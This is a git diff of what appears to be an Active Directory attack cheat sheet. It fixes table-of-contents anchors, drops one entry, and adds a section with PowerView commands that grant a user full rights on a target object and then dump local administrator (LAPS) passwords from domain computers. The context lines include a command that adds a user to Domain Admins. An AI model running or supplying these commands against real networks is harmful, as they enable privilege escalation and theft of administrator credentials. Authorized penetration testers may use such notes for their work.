@@ -7,7 +7,7 @@
   * [ACL-abuses](#ACL-abuses)
     * [Permissions on a User](#Permissions-on-a-user)
     * [Permissions on a Group](#Permissions-on-a-group)
-    * [Permissions on a ComputerObject](#Permissions-on-ComputerObject)
+    * [Permissions on a ComputerObject](#Permissions-on-a-ComputerObject)
     * [Permissions on Domain Object]([Permissions-on-Domain-Object)
     * [Permissions on a OU](#Permissions-on-OU)
     * [Writeowner of an object](#Writeowner-of-an-object---Change-the-owner)
@@ -30,7 +30,6 @@
   * [MS Exchange escalating privileges](#MS-Exchange-escalating-privileges)
   * [NTLM Relay MS Exchange abuse](#NTLM-Relay-MS-Exchange-abuse)
 * [Local Administrator Password Solution(LAPS)](#LAPS)
-  * [Set pre-auth not required](#Set-pre-auth-not-required)  
 * [DNS Admins](#DNS-Admins)
 * [Trust abuse SQL](#Trust-abuse-SQL)
   * [Locating and accessing SQL Servers](#Locating-and-accessing-SQL-Servers)
@@ -281,9 +280,15 @@ Add-DomainGroupMember -Identity "<GROUP>" -Members <USER> -Verbose
 net group "Domain Admins" analyst1 /domain /add
 ```
 
-### Permissions on ComputerObject
+### Permissions on a ComputerObject
 #### GenericWrite - Computer object takeover
 See [Computer object takeover](#Computer-object-Takeover) 
+
+#### Writedacl - Read LAPS password
+```
+Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose
+Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
+```
 
 ### Permissions on Domain Object
 #### Writedacl - Add permissions for dcsync
